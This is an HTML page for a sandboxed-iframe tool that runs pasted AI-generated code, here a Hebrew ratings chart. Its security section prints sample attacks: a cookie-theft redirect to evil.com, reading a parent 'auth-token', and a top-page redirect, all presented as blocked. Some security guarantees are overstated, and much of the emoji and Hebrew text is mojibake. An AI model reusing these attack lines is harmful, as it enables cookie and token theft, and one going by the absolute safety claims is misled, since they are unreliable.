<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Secure AI Code Isolator</title>
    <!-- iframe-resizer for responsive height solution -->
    <script src="https://cdn.jsdelivr.net/npm/@iframe-resizer/parent@5.4.6"></script>
    <style>
      body {
        font-family: Arial, sans-serif;
        max-width: 900px;
        margin: 0 auto;
        padding: 20px;
        background: #f8f9fa;
      }

      .header {
        background: #007bff;
        color: white;
        padding: 20px;
        border-radius: 8px;
        margin-bottom: 20px;
        text-align: center;
      }

      .security-info {
        background: #d4edda;
        border: 1px solid #c3e6cb;
        color: #155724;
        padding: 15px;
        border-radius: 5px;
        margin-bottom: 20px;
      }

      .input-section {
        background: white;
        padding: 20px;
        border-radius: 8px;
        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        margin-bottom: 20px;
      }

      textarea {
        width: 100%;
        height: 250px;
        font-family: "Courier New", monospace;
        padding: 10px;
        border: 2px solid #ddd;
        border-radius: 5px;
        resize: vertical;
        box-sizing: border-box;
      }

      .controls {
        display: flex;
        gap: 10px;
        margin: 15px 0;
        flex-wrap: wrap;
      }

      button {
        background: #007bff;
        color: white;
        border: none;
        padding: 12px 20px;
        border-radius: 5px;
        cursor: pointer;
        font-size: 14px;
      }

      button:hover {
        background: #0056b3;
      }

      .btn-danger {
        background: #dc3545;
      }
      .btn-danger:hover {
        background: #c82333;
      }

      .btn-success {
        background: #28a745;
      }
      .btn-success:hover {
        background: #218838;
      }

      .output-section {
        background: white;
        padding: 20px;
        border-radius: 8px;
        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        margin-bottom: 20px;
      }

      .secure-iframe {
        width: 100%;
        border: 2px solid #007bff;
        border-radius: 5px;
        min-height: 400px;
        background: white;
      }

      .code-output {
        background: #2d3748;
        color: #e2e8f0;
        padding: 15px;
        border-radius: 5px;
        font-family: "Courier New", monospace;
        font-size: 12px;
        white-space: pre-wrap;
        word-break: break-all;
        max-height: 200px;
        overflow-y: auto;
        margin: 10px 0;
      }

      .status {
        padding: 10px;
        border-radius: 5px;
        margin: 10px 0;
        font-weight: bold;
      }

      .status.safe {
        background: #d4edda;
        color: #155724;
        border: 1px solid #c3e6cb;
      }
      .status.warning {
        background: #fff3cd;
        color: #856404;
        border: 1px solid #ffeaa7;
      }

      .security-features {
        background: #f8f9fa;
        border: 1px solid #dee2e6;
        padding: 15px;
        border-radius: 5px;
        margin: 15px 0;
      }

      .security-features h4 {
        margin-top: 0;
        color: #495057;
      }
      .security-features ul {
        margin: 10px 0;
        padding-left: 20px;
      }
      .security-features li {
        margin: 5px 0;
      }
    </style>
  </head>
  <body>
    <div class="header">
      <h1>ğŸ”’ Secure AI Code Isolator</h1>
      <p>Safely execute AI-generated code with complete XSS protection</p>
    </div>

    <div class="security-info">
      <strong>ğŸ›¡ï¸ Security Features:</strong> Sandboxed iframe â€¢ No same-origin
      access â€¢ No parent navigation â€¢ CSP protection â€¢ Data URI isolation
    </div>

    <div class="input-section">
      <h3>AI-Generated Code Input</h3>
      <textarea
        id="ai-code"
        placeholder="Paste any AI-generated HTML/CSS/JavaScript code here..."
      >
<script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/4.4.0/chart.umd.js"></script>

<style>
        body {
            font-family: Arial, Hebrew, sans-serif;
            background-color: #f5f5f5;
            margin: 0;
            padding: 20px;
            direction: rtl;
        }
        .container {
            max-width: 900px;
            margin: 0 auto;
            background-color: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        h1 {
            text-align: center;
            color: #333;
            margin-bottom: 30px;
        }
        .buttons {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-bottom: 30px;
            flex-wrap: wrap;
        }
        button {
            padding: 12px 24px;
            font-size: 16px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: all 0.3s;
            font-weight: bold;
            background-color: #e0e0e0;
            color: #333;
        }
        button:hover {
            background-color: #d0d0d0;
        }
        button.active {
            background-color: #2196F3;
            color: white;
        }
        .chart-container {
            position: relative;
            height: 400px;
            margin-top: 20px;
        }
        .stats {
            text-align: center;
            margin-top: 20px;
            font-size: 14px;
            color: #666;
        }
</style>

<div class="container">
    <h1>× ×ª×•× ×™ ×¨×™×™×˜×™× ×’ - ×¨×¦×•×¢×•×ª ×©×™×“×•×¨</h1>
    <div class="buttons">
        <button onclick="showData('main')" class="active">××”×“×•×¨×” ××¨×›×–×™×ª</button>
        <button onclick="showData('prime')">×¤×¨×™×™× ×˜×™×™×</button>
        <button onclick="showData('late')">×œ×™×™×˜ × ×™×™×˜</button>
    </div>
    <div class="chart-container">
        <canvas id="ratingsChart"></canvas>
    </div>
    <div class="stats" id="stats"></div>
</div>

<script>
        const data = {
            main: {
                labels: ['×—×“×©×•×ª 12', '×—×“×©×•×ª 14', '×—×“×©×•×ª 13', '×—×“×©×•×ª 11'],
                viewers: [516, 264, 245, 123],
                rating: [19.8, 9.5, 7.8, 4.6],
                shows: ['×™×•× ×™×ª ×œ×•×™ ×•×“× ×™ ×§×•×©××¨×•', '××’×™ ×˜×‘×™×‘×™', '××•×“×™ ×¡×’×œ ×•×“×•×¨×™×” ×œ××¤×œ', '×˜×œ ×‘×¨××Ÿ ×•×˜×œ×™ ××•×¨× ×•']
            },
            prime: {
                labels: ['×¨×•×§×“×™× ×¢× ×›×•×›×‘×™×\n(×§×©×ª 12)', '×”××— ×”×’×“×•×œ\n(×¨×©×ª 13)', '×”×¤×˜×¨×™×•×˜×™×\n(×¢×¨×•×¥ 14)'],
                viewers: [493, 414, 320],
                rating: [18.7, 14.7, 10.6],
                shows: ['', '', '×™× ×•×Ÿ ××’×œ ×¢× × ×ª× ×™×”×•']
            },
            late: {
                labels: ['××‘×¨×™ ×’×œ×¢×“ ×•×™××™×¨ ×©×¨×§×™\n(×§×©×ª 12)', '×”×¦×™× ×•×¨ - ×’×™× ×œ×¨×¨\n(×¨×©×ª 13)', '×”×™×•× ×©×”×™×”\n(×¨×©×ª 13)', '×—×“×©×•×ª ×”×œ×™×œ×”\n(×¢×¨×•×¥ 14)', '×—×“×©×•×ª ×”×œ×™×œ×”\n(×›××Ÿ 11)'],
                viewers: [261, 229, 148, 95, 77],
                rating: [10.4, 7.5, 5.4, 3.6, 2.9],
                shows: ['', '', '', '×™×”×•×“×” ×©×œ×–×™× ×’×¨', '×¢××¨×™ ××¡× ×”×™×™× ×•×¨×•× ×™ ×§×•×‘×Ÿ']
            }
        };

        let chart;
        const ctx = document.getElementById('ratingsChart').getContext('2d');

        function createChart(dataKey) {
            const currentData = data[dataKey];
            
            if (chart) {
                chart.destroy();
            }

            chart = new Chart(ctx, {
                type: 'bar',
                data: {
                    labels: currentData.labels,
                    datasets: [
                        {
                            label: '×¦×•×¤×™× (××œ×¤×™×)',
                            data: currentData.viewers,
                            backgroundColor: 'rgba(33, 150, 243, 0.7)',
                            borderColor: 'rgba(33, 150, 243, 1)',
                            borderWidth: 1,
                            yAxisID: 'y-viewers'
                        },
                        {
                            label: '× ×ª×— ×¦×¤×™×™×” (%)',
                            data: currentData.rating,
                            backgroundColor: 'rgba(255, 99, 132, 0.7)',
                            borderColor: 'rgba(255, 99, 132, 1)',
                            borderWidth: 1,
                            type: 'line',
                            yAxisID: 'y-rating'
                        }
                    ]
                },
                options: {
                    responsive: true,
                    maintainAspectRatio: false,
                    plugins: {
                        title: {
                            display: false
                        },
                        legend: {
                            display: true,
                            position: 'top',
                            labels: {
                                font: {
                                    size: 14
                                }
                            }
                        }
                    },
                    scales: {
                        'y-viewers': {
                            type: 'linear',
                            position: 'right',
                            title: {
                                display: true,
                                text: '×¦×•×¤×™× (××œ×¤×™×)',
                                font: {
                                    size: 14
                                }
                            },
                            grid: {
                                drawOnChartArea: false
                            }
                        },
                        'y-rating': {
                            type: 'linear',
                            position: 'left',
                            title: {
                                display: true,
                                text: '× ×ª×— ×¦×¤×™×™×” (%)',
                                font: {
                                    size: 14
                                }
                            },
                            max: 25
                        },
                        x: {
                            ticks: {
                                font: {
                                    size: 12
                                },
                                maxRotation: 0,
                                autoSkip: false
                            }
                        }
                    }
                }
            });

            updateStats(dataKey);
        }

        function showData(dataKey) {
            document.querySelectorAll('button').forEach(btn => btn.classList.remove('active'));
            event.target.classList.add('active');
            createChart(dataKey);
        }

        function updateStats(dataKey) {
            const currentData = data[dataKey];
            const totalViewers = currentData.viewers.reduce((a, b) => a + b, 0);
            const avgViewers = Math.round(totalViewers / currentData.viewers.length);
            const maxViewers = Math.max(...currentData.viewers);
            const minViewers = Math.min(...currentData.viewers);
            
            let statsText = `×¡×”"×› ×¦×•×¤×™×: ${totalViewers} ××œ×£ | ×××•×¦×¢: ${avgViewers} ××œ×£ | `;
            statsText += `×”×’×‘×•×” ×‘×™×•×ª×¨: ${maxViewers} ××œ×£ | ×”× ××•×š ×‘×™×•×ª×¨: ${minViewers} ××œ×£`;
            
            document.getElementById('stats').textContent = statsText;
        }

        // Initialize with main news data
        createChart('main');
</script></textarea
      >

      <div class="controls">
        <button onclick="executeSecurely()">ğŸ”’ Execute Securely</button>
        <button onclick="executeSecurelyResponsive()" class="btn-success">
          ğŸ”’ğŸ“ Execute Securely Responsive
        </button>
        <button onclick="generateEmbedCode()" class="btn-success">
          ğŸ“‹ Generate Embed Code
        </button>
        <button
          onclick="generateResponsiveEmbedCode()"
          style="background: #17a2b8; color: white"
        >
          ğŸ“‹ğŸ“ Generate Responsive Embed Code
        </button>
        <button onclick="clearAll()" class="btn-danger">ğŸ—‘ï¸ Clear All</button>
      </div>
    </div>

    <div class="output-section" id="output-section" style="display: none">
      <h3 id="execution-title">ğŸ›¡ï¸ Secure Execution Result</h3>
      <div class="status safe" id="security-status">
        âœ… Code executed in secure sandbox - No access to parent page
      </div>

      <div class="security-features">
        <h4>Active Security Measures:</h4>
        <ul>
          <li>ğŸ”’ <strong>Sandboxed iframe</strong> - No same-origin access</li>
          <li>
            ğŸš« <strong>No parent navigation</strong> - Cannot redirect main page
          </li>
          <li>ğŸŒ <strong>Data URI isolation</strong> - No external requests</li>
          <li>
            ğŸ›¡ï¸ <strong>CSP protection</strong> - Content Security Policy
            enforced
          </li>
          <li>
            âš¡ <strong>Script execution controlled</strong> - Only within
            sandbox
          </li>
          <li id="responsive-feature" style="display: none">
            ğŸ“ <strong>Responsive height</strong> - Automatic content-based
            sizing
          </li>
        </ul>
      </div>

      <iframe id="secure-iframe" class="secure-iframe"></iframe>
    </div>

    <div class="output-section" id="embed-section" style="display: none">
      <h3>ğŸ“‹ Portable Embed Code</h3>
      <p>Copy this code to safely embed AI-generated content anywhere:</p>

      <div class="controls">
        <button onclick="copyEmbedCode()" class="btn-success">
          ğŸ“‹ Copy to Clipboard
        </button>
        <button onclick="selectAllCode()">ğŸ”¤ Select All</button>
      </div>

      <textarea
        id="embed-textarea"
        readonly
        style="
          width: 100%;
          height: 200px;
          font-family: 'Courier New', monospace;
          font-size: 12px;
          padding: 10px;
          border: 2px solid #28a745;
          border-radius: 5px;
          background: #f8f9fa;
          resize: vertical;
          box-sizing: border-box;
        "
      ></textarea>

      <div class="security-info" style="margin-top: 15px">
        <strong>ğŸ”’ Security Guarantee:</strong> This embed code uses sandboxed
        iframe technology to ensure complete isolation from your parent page.
        AI-generated code cannot access cookies, DOM, or redirect your site.
      </div>
    </div>

    <!-- Technical Documentation Section -->
    <div class="output-section">
      <h3>ğŸ”§ Technical Documentation & Algorithm</h3>

      <div class="security-features">
        <h4>ğŸ§  Actual Algorithm Implementation (Code Steps):</h4>
        <div
          style="
            background: #2d3748;
            color: #e2e8f0;
            padding: 20px;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            margin: 10px 0;
            line-height: 1.6;
          "
        >
          <div style="margin-bottom: 20px">
            <strong style="color: #4ade80">Step 1: Get User Input</strong><br />
            <span style="margin-left: 20px; color: #fbbf24"
              >const code =
              document.getElementById('ai-code').value.trim();</span
            ><br />
            <span style="margin-left: 20px; color: #a0aec0"
              >// Raw HTML/CSS/JS string from textarea</span
            >
          </div>

          <div style="margin-bottom: 20px">
            <strong style="color: #4ade80"
              >Step 2: Create Complete HTML Document</strong
            ><br />
            <span style="margin-left: 20px; color: #fbbf24"
              >const fullHTML = `&lt;!DOCTYPE html&gt;</span
            ><br />
            <span style="margin-left: 20px; color: #fbbf24">&lt;html&gt;</span
            ><br />
            <span style="margin-left: 20px; color: #fbbf24">&lt;head&gt;</span
            ><br />
            <span style="margin-left: 20px; color: #fbbf24">
              &lt;meta charset="UTF-8"&gt;</span
            ><br />
            <span style="margin-left: 20px; color: #fbbf24">
              &lt;meta name="viewport" content="width=device-width,
              initial-scale=1.0"&gt;</span
            ><br />
            <span style="margin-left: 20px; color: #fbbf24">
              &lt;meta http-equiv="Content-Security-Policy"
              content="..."&gt;</span
            ><br />
            <span style="margin-left: 20px; color: #fbbf24">&lt;/head&gt;</span
            ><br />
            <span style="margin-left: 20px; color: #fbbf24"
              >&lt;body style="margin: 0;"&gt;</span
            ><br />
            <span style="margin-left: 20px; color: #fbbf24">${code}</span><br />
            <span style="margin-left: 20px; color: #fbbf24">&lt;/body&gt;</span
            ><br />
            <span style="margin-left: 20px; color: #fbbf24"
              >&lt;/html&gt;`;</span
            ><br />
            <span style="margin-left: 20px; color: #a0aec0"
              >// Inject user code into complete HTML structure</span
            >
          </div>

          <div style="margin-bottom: 20px">
            <strong style="color: #4ade80">Step 3: Encode to Base64</strong
            ><br />
            <span style="margin-left: 20px; color: #fbbf24"
              >const base64Content =
              btoa(unescape(encodeURIComponent(fullHTML)));</span
            ><br />
            <span style="margin-left: 20px; color: #a0aec0"
              >// Convert to base64 to prevent character encoding issues</span
            >
          </div>

          <div style="margin-bottom: 20px">
            <strong style="color: #4ade80">Step 4: Create Iframe Element</strong
            ><br />
            <span style="margin-left: 20px; color: #fbbf24"
              >const iframe = document.getElementById('secure-iframe');</span
            ><br />
            <span style="margin-left: 20px; color: #fbbf24"
              >iframe.src = 'about:blank'; // Reset iframe</span
            ><br />
            <span style="margin-left: 20px; color: #a0aec0"
              >// Get existing iframe element and reset it</span
            >
          </div>

          <div style="margin-bottom: 20px">
            <strong style="color: #4ade80"
              >Step 5: Apply Sandbox Security</strong
            ><br />
            <span style="margin-left: 20px; color: #fbbf24"
              >iframe.setAttribute('sandbox', 'allow-scripts allow-forms
              allow-popups allow-modals');</span
            ><br />
            <span style="margin-left: 20px; color: #a0aec0"
              >// CRITICAL: No allow-same-origin or allow-top-navigation</span
            >
          </div>

          <div style="margin-bottom: 0">
            <strong style="color: #4ade80"
              >Step 6: Load Content via Data URI</strong
            ><br />
            <span style="margin-left: 20px; color: #fbbf24"
              >const dataUri = 'data:text/html;charset=utf-8;base64,' +
              base64Content;</span
            ><br />
            <span style="margin-left: 20px; color: #fbbf24"
              >iframe.src = dataUri;</span
            ><br />
            <span style="margin-left: 20px; color: #a0aec0"
              >// Load content via data URI (no external requests)</span
            ><br />
            <span style="margin-left: 20px; color: #a0aec0"
              >// iframe runs in null origin context for security</span
            >
          </div>
        </div>

        <div
          style="
            background: #fff3cd;
            border: 1px solid #ffeaa7;
            padding: 15px;
            border-radius: 5px;
            margin-top: 15px;
          "
        >
          <strong style="color: #856404">âš ï¸ Auto-Resize Limitation:</strong
          ><br />
          <span style="color: #856404"
            >Auto-resize is intentionally disabled due to security model.
            Without `allow-same-origin`, parent cannot access
            `iframe.contentDocument` (this is good for security!). Iframe uses
            fixed height or manual CSS sizing.</span
          >
        </div>

        <div class="security-features">
          <h4>ğŸ”§ Algorithm Summary:</h4>
          <br />
          <div
            style="
              background: #f8f9fa;
              border: 1px solid #dee2e6;
              padding: 15px;
              border-radius: 5px;
              margin: 10px 0;
            "
          >
            <strong>ğŸ”’ Standard Mode (Fixed Height):</strong><br />
            <span style="color: #155724"
              >â€¢ Input â†’ HTML wrapper â†’ Base64 â†’ Data URI â†’ Sandboxed
              iframe</span
            ><br />
            <span style="color: #155724"
              >â€¢ No content filtering - security comes from sandbox
              isolation</span
            ><br />
            <span style="color: #155724"
              >â€¢ Base64 encoding prevents injection during URI creation</span
            ><br />
            <span style="color: #155724"
              >â€¢ Sandbox isolation prevents parent access (including
              auto-resize)</span
            >
          </div>

          <div
            style="
              background: #e8f4fd;
              border: 1px solid #bee5eb;
              padding: 15px;
              border-radius: 5px;
              margin: 10px 0;
            "
          >
            <strong>ğŸ“ Responsive Mode (Auto-Height):</strong><br />
            <span style="color: #0c5460"
              >â€¢ Same security as standard mode + iframe-resizer
              integration</span
            ><br />
            <span style="color: #0c5460"
              >â€¢ Uses PostMessage API for secure parent-child
              communication</span
            ><br />
            <span style="color: #0c5460"
              >â€¢ Child script measures content height and sends to parent</span
            ><br />
            <span style="color: #0c5460"
              >â€¢ Parent script safely resizes iframe without breaking
              sandbox</span
            ><br />
            <span style="color: #0c5460"
              >â€¢ GPLv3 license for open source projects</span
            >
          </div>
        </div>
      </div>

      <div class="security-features">
        <h4>âœ… Supported Content Types:</h4>
        <ul>
          <li>
            <strong>âœ… Pure HTML/CSS:</strong> Complete layout and styling
            support
          </li>
          <li>
            <strong>âœ… JavaScript:</strong> Full ES5/ES6+ support with DOM
            manipulation
          </li>
          <li>
            <strong>âœ… External CDN Libraries:</strong> Chart.js, D3.js,
            Three.js, etc. from CDNJS
          </li>
          <li>
            <strong>âœ… CSS Frameworks:</strong> Bootstrap, Tailwind, custom
            frameworks
          </li>
          <li>
            <strong>âœ… Interactive Elements:</strong> Forms, buttons,
            animations, games
          </li>
          <li>
            <strong>âœ… Canvas/WebGL:</strong> Graphics, charts, 3D content
          </li>
          <li>
            <strong>âœ… SVG Graphics:</strong> Scalable vector graphics with
            animations
          </li>
          <li>
            <strong>âœ… CSS Animations:</strong> Keyframes, transitions,
            transforms
          </li>
          <li>
            <strong>âœ… Web APIs:</strong> LocalStorage (within iframe), Canvas,
            Audio (limited)
          </li>
          <li>
            <strong>âœ… Hebrew/RTL Content:</strong> Full internationalization
            support
          </li>
          <li>
            <strong>âœ… Complex Data Visualizations:</strong> Your Chart.js
            Hebrew ratings work perfectly
          </li>
          <li>
            <strong>ğŸ†• Responsive Height:</strong> Auto-sizing with
            iframe-resizer (responsive mode)
          </li>
        </ul>
      </div>

      <div class="security-features">
        <h4>ğŸ”„ Nested Iframe/Embed Handling:</h4>
        <div
          style="
            background: #fff3cd;
            border: 1px solid #ffeaa7;
            padding: 15px;
            border-radius: 5px;
            margin: 10px 0;
          "
        >
          <strong>ğŸ“‹ Example: Nested Iframe Code</strong>
          <div
            style="
              background: #2d3748;
              color: #e2e8f0;
              padding: 10px;
              border-radius: 3px;
              font-family: monospace;
              font-size: 11px;
              margin: 5px 0;
            "
          >
            &lt;!-- This works perfectly and safely --&gt; &lt;iframe
            src="https://example.com/widget"&gt;&lt;/iframe&gt; &lt;embed
            src="https://example.com/content.pdf"&gt;&lt;/embed&gt; &lt;object
            data="https://example.com/flash.swf"&gt;&lt;/object&gt; &lt;!--
            YouTube, CodePen, JSFiddle embeds work --&gt; &lt;iframe
            src="https://www.youtube.com/embed/VIDEO_ID"&gt;&lt;/iframe&gt;
            &lt;iframe src="https://codepen.io/pen/EMBED_ID"&gt;&lt;/iframe&gt;
            &lt;!-- Your Chart.js Hebrew content works perfectly --&gt;
            &lt;script
            src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/4.4.0/chart.umd.js"&gt;&lt;/script&gt;
            &lt;canvas id="myChart"&gt;&lt;/canvas&gt; &lt;script&gt; // Even
            malicious attempts are contained: try { parent.window.location =
            "https://malicious.com"; // âŒ BLOCKED top.document.body.innerHTML =
            "HACKED"; // âŒ BLOCKED window.parent.postMessage("attack", "*"); //
            âŒ BLOCKED } catch(e) { console.log("Attack prevented by sandbox!");
            } &lt;/script&gt;
          </div>
          <strong>ğŸ›¡ï¸ Security Result:</strong>
          <ul style="margin: 5px 0; padding-left: 20px">
            <li>âœ… Nested iframes load normally within the sandbox</li>
            <li>âœ… External embeds work (YouTube, CodePen, etc.)</li>
            <li>âœ… CDN libraries (Chart.js, D3.js) load and execute safely</li>
            <li>âœ… Malicious scripts are trapped and cannot escape</li>
            <li>âœ… Parent page remains completely protected</li>
            <li>âœ… Hebrew/RTL content renders perfectly</li>
          </ul>
        </div>
      </div>

      <div class="security-features">
        <h4>âš ï¸ Known Limitations:</h4>
        <ul>
          <li>
            <strong>âŒ File Downloads:</strong> Cannot trigger downloads to
            user's computer
          </li>
          <li>
            <strong>âŒ Camera/Microphone:</strong> No access to user media
            devices
          </li>
          <li>
            <strong>âŒ Cross-Origin Requests:</strong> AJAX limited by CORS
            policies
          </li>
          <li>
            <strong>âŒ Browser Storage Sharing:</strong> Cannot access parent
            page's localStorage/cookies
          </li>
          <li>
            <strong>âŒ Navigation Control:</strong> Cannot redirect or navigate
            parent page
          </li>
          <li>
            <strong>âŒ Print Functionality:</strong> window.print() only affects
            iframe content
          </li>
          <li>
            <strong>âš ï¸ Auto-Height (Standard Mode):</strong> Fixed height only -
            use responsive mode for auto-sizing
          </li>
          <li>
            <strong>ğŸ“ Responsive Mode Dependency:</strong> Requires
            iframe-resizer library for auto-height
          </li>
        </ul>
      </div>

      <div class="security-features">
        <h4>ğŸ§ª Security Test Examples:</h4>
        <p>
          <strong
            >âš ï¸ These are examples of malicious code that gets BLOCKED by our
            sandbox (attacks that FAIL):</strong
          >
        </p>
        <button
          onclick="showSecurityTests()"
          style="
            background: #6f42c1;
            color: white;
            border: none;
            padding: 8px 15px;
            border-radius: 3px;
            cursor: pointer;
            margin: 5px 0;
          "
        >
          ğŸ” Show Blocked Attack Examples
        </button>
        <div id="security-tests" style="display: none; margin-top: 10px">
          <div
            style="
              background: #f8d7da;
              border: 1px solid #f5c6cb;
              padding: 15px;
              border-radius: 5px;
              margin-bottom: 10px;
            "
          >
            <strong
              >ğŸš¨ WARNING: These are examples of attacks that our sandbox
              PREVENTS and BLOCKS</strong
            >
          </div>
          <div
            style="
              background: #2d3748;
              color: #e2e8f0;
              padding: 15px;
              border-radius: 5px;
              font-family: monospace;
              font-size: 11px;
            "
          >
            <span style="color: #ff6b6b"
              >// âŒ ATTACK EXAMPLE 1: XSS Attempt (GETS BLOCKED)</span
            >
            &lt;script&gt; try {
            <span style="color: #ff6b6b"
              >// âŒ Try to steal cookies - FAILS</span
            >
            document.location = "https://evil.com?cookies=" + document.cookie;

            <span style="color: #ff6b6b"
              >// âŒ Try to access parent page - FAILS</span
            >
            parent.document.getElementById("sensitive-data").innerHTML =
            "HACKED";

            <span style="color: #ff6b6b"
              >// âŒ Try to redirect parent page - FAILS</span
            >
            top.location.href = "https://malicious-site.com";

            <span style="color: #ff6b6b"
              >// âŒ Try to access parent's localStorage - FAILS</span
            >
            alert(parent.localStorage.getItem("auth-token")); } catch(e) {
            <span style="color: #4ade80"
              >// âœ… This message appears - all attacks blocked!</span
            >
            console.log("ğŸ›¡ï¸ All attacks blocked by sandbox!"); } &lt;/script&gt;

            <span style="color: #4ade80"
              >// âœ… SAFE EXAMPLE: External Content (WORKS PERFECTLY)</span
            >
            &lt;h1&gt;Safe External Content&lt;/h1&gt; &lt;iframe
            src="https://www.youtube.com/embed/dQw4w9WgXcQ"&gt;&lt;/iframe&gt;
            &lt;iframe
            src="https://codepen.io/team/codepen/embed/PNaGbb"&gt;&lt;/iframe&gt;

            <span style="color: #4ade80"
              >// âœ… SAFE EXAMPLE: Complex Interactive Content (WORKS
              PERFECTLY)</span
            >
            &lt;canvas id="gameCanvas"&gt;&lt;/canvas&gt; &lt;script&gt;
            <span style="color: #4ade80"
              >// âœ… Full game or visualization - completely safe and
              functional</span
            >
            const canvas = document.getElementById("gameCanvas"); const ctx =
            canvas.getContext("2d"); // ... complex graphics code works
            perfectly &lt;/script&gt;
          </div>
          <div
            style="
              background: #d4edda;
              border: 1px solid #c3e6cb;
              padding: 15px;
              border-radius: 5px;
              margin-top: 10px;
            "
          >
            <strong>ğŸ›¡ï¸ SECURITY RESULT:</strong>
            <ul style="margin: 10px 0; padding-left: 20px">
              <li>
                <strong>âŒ All malicious attempts FAIL and get blocked</strong>
              </li>
              <li>
                <strong
                  >âŒ No access to parent page, cookies, or navigation</strong
                >
              </li>
              <li>
                <strong>âŒ Attackers cannot break out of the sandbox</strong>
              </li>
              <li>
                <strong
                  >âœ… Legitimate content (YouTube, games, charts) works
                  perfectly</strong
                >
              </li>
              <li><strong>âœ… Your main page stays 100% protected</strong></li>
            </ul>
          </div>
        </div>
      </div>

      <div class="security-features">
        <h4>ğŸ”¬ Technical Implementation Details:</h4>
        <div
          style="
            background: #f8f9fa;
            border: 1px solid #dee2e6;
            padding: 15px;
            border-radius: 5px;
            font-family: monospace;
            font-size: 12px;
          "
        >
          <strong>Sandbox Attributes Used:</strong>
          â€¢ allow-scripts: Enables JavaScript execution within iframe â€¢
          allow-forms: Allows form submission within iframe â€¢ allow-popups:
          Permits alert(), confirm(), prompt() â€¢ allow-modals: Enables modal
          dialogs

          <strong>Sandbox Attributes EXCLUDED (for security):</strong>
          â€¢ allow-same-origin: Would grant access to parent domain â€¢
          allow-top-navigation: Would allow redirecting parent page â€¢
          allow-pointer-lock: Would capture mouse permanently â€¢
          allow-presentation: Would access presentation displays

          <strong>Data URI Structure:</strong>
          data:text/html;charset=utf-8;base64,[ENCODED_CONTENT]

          <strong>CSP Headers Applied:</strong>
          default-src 'self' 'unsafe-inline' data: https://cdnjs.cloudflare.com
          script-src 'self' 'unsafe-inline' 'unsafe-eval'
          https://cdnjs.cloudflare.com
        </div>
      </div>
    </div>

    <script>
      let currentEmbedCode = "";
      let currentIframeResizer = null;

      function executeSecurely() {
        const code = document.getElementById("ai-code").value.trim();
        if (!code) {
          alert("Please enter some code to execute");
          return;
        }

        // Create secure iframe
        createSecureIframe(code);

        // Show output section
        document.getElementById("output-section").style.display = "block";
        document.getElementById("embed-section").style.display = "none";
      }

      function executeSecurelyResponsive() {
        // Step 3a: Get user input (copy from executeSecurely)
        const code = document.getElementById("ai-code").value.trim();
        if (!code) {
          alert("Please enter some code to execute");
          return;
        }

        // Step 3b: The key difference - add responsive parameter
        createSecureIframe(code, true); // true = responsive mode

        // Step 3c: Update UI to show it's responsive
        document.getElementById("execution-title").textContent =
          "ğŸ›¡ï¸ğŸ“ Secure Responsive Execution Result";
        document.getElementById("responsive-feature").style.display =
          "list-item";
        document.getElementById("output-section").style.display = "block";
        document.getElementById("embed-section").style.display = "none";
      }

      function createSecureIframe(htmlContent, responsive = false) {
        // Step 4a: Cleanup previous iframe-resizer (important!)
        if (currentIframeResizer && currentIframeResizer.length > 0) {
          try {
            currentIframeResizer.forEach((iframe) => {
              if (iframe && iframe.iframeResizer) {
                iframe.iframeResizer.close();
              }
            });
          } catch (e) {
            console.log("Cleanup error:", e);
          }
          currentIframeResizer = null;
        }

        // Step 4b: Conditionally add iframe-resizer child script
        const childScript = responsive
          ? `\n<${"script"} src="https://cdn.jsdelivr.net/npm/@iframe-resizer/child@5.4.6"></${"script"}>`
          : "";

        // Step 4c: Build HTML with optional child script
        const fullHTML = `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' 'unsafe-eval' data: https://cdn.jsdelivr.net; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdn.jsdelivr.net https://cdnjs.cloudflare.com;">
    <title>Secure AI Code Execution</title>
    ${childScript}
</head>
<body style="margin: 0; padding: 0;">
${htmlContent}
</body>
</html>`;

        // Step 4d: Create iframe (same as before)
        const iframe = document.getElementById("secure-iframe");
        iframe.src = "about:blank";
        iframe.style.height = responsive ? "100px" : "500px";
        iframe.setAttribute(
          "sandbox",
          "allow-scripts allow-forms allow-popups allow-modals"
        );

        const dataUri =
          "data:text/html;charset=utf-8," + encodeURIComponent(fullHTML);
        iframe.src = dataUri;

        // Step 4e: Setup iframe-resizer ONLY if responsive mode
        if (responsive && typeof iframeResize === "function") {
          iframe.onload = function () {
            try {
              currentIframeResizer = iframeResize(
                {
                  license: "GPLv3",
                  log: false, // Set to true for debugging if needed
                  checkOrigin: false,
                },
                iframe
              );
              console.log("âœ… iframe-resizer initialized");
            } catch (e) {
              console.log("âŒ iframe-resizer failed:", e);
              iframe.style.height = "500px"; // Keep fallback
            }
          };
        }
      }

      function generateEmbedCode() {
        const code = document.getElementById("ai-code").value.trim();
        if (!code) {
          alert("Please enter some code first");
          return;
        }

        // Generate secure embed code
        const fullHTML = `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' 'unsafe-eval' data: https://cdnjs.cloudflare.com; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdnjs.cloudflare.com;">
</head>
<body style="margin: 0;">
${code}
</body>
</html>`;

        const base64Content = btoa(unescape(encodeURIComponent(fullHTML)));

        const embedCode = `<!-- Secure AI Code Embed - XSS Protected -->
<iframe 
    style="width: 100%; border: 1px solid #ddd; height: 500px; border-radius: 5px;" 
    sandbox="allow-scripts allow-forms allow-popups allow-modals"
    src="data:text/html;charset=utf-8;base64,${base64Content}">
</iframe>
<!-- Security: Sandboxed iframe prevents XSS attacks and parent page access -->`;

        currentEmbedCode = embedCode;
        document.getElementById("embed-textarea").value = embedCode;
        document.getElementById("embed-section").style.display = "block";
      }

      function generateResponsiveEmbedCode() {
        // Step 5a: Input validation (same pattern)
        const code = document.getElementById("ai-code").value.trim();
        if (!code) {
